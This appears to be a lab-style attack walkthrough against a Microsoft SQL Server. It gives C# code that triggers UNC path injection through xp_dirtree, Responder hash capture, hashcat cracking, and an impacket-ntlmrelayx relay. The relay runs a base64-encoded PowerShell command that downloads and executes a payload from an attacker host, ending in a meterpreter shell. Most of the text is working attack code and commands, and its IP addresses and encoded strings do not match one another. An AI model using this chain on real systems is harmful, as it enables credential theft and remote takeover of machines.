As SQL Auth is succss with guest account, we can try UNC Path injection to retrive more privileged account's password hash.

```
ï»¿using System;
using System.Data;
using System.Data.SqlClient;

namespace MSSQLTest
{
    public class Program
    {
        public static void Main(string[] args)
        {

            //Console.WriteLine("Please enter your Server name ...");
            //String sqlServer = Console.ReadLine();
            String sqlServer = "web06.dev.final.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            bool issystemadmin = false;
            bool shelldisabled = false;

            bool dblink_issystemadmin = false;
            bool dblink_shelldisabled = false;
            bool dblink_rpcdisabled = false;


            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
                //Console.ReadLine();

            }
            catch
            {
                Console.WriteLine("Auth failed");
                //Console.ReadLine();
                Environment.Exit(0);
            }
			
			String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";
			SqlCommand command = new SqlCommand(query, con);
			SqlDataReader reader = command.ExecuteReader();
			
			reader.Close();

            
		}
	}
}
```

We can capture the hash in kali machine by responder. Before starting responder smb service should be stopped. Open terminal in kali and run:

```
sudo responder -I tun0
```

And now go back to compromised windows machine and execute the c# application to inject UNC path. When executed we should see a hash in responder.

The hash can be cracked with hashcat:
```
hashcat -m 5600 hash.txt dict.txt --force
```

But we also can use impacket to access the target machine without cracking the hash. Generate powershell payload with msfvenom and paste powershell shellcode runner then upload to the webserver to download from compromized machine. 

Now generate encoded powershell command to use with impacket tool:

```
PS /home/kali/cobalt> clear
PS /home/kali/cobalt> $text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.88.120/run.txt') | IEX"
PS /home/kali/cobalt> $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
PS /home/kali/cobalt> $EncodedText = [Convert]::ToBase64String($bytes)
PS /home/kali/cobalt> $EncodedText
KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQAyADAALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=
PS /home/kali/cobalt> 
```

And execute impacket-ntlmrelayx:
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMQA4AC4AOQA6ADgAMQAvAHIAdQBuAC4AcABzADEAJwApACAAfAAgAEkARQBYAA=='
```


Finally, we need to execute the c# application on the windows 10 machine to force the smb request from sql server.

At the moment we should have meterpreter shell already.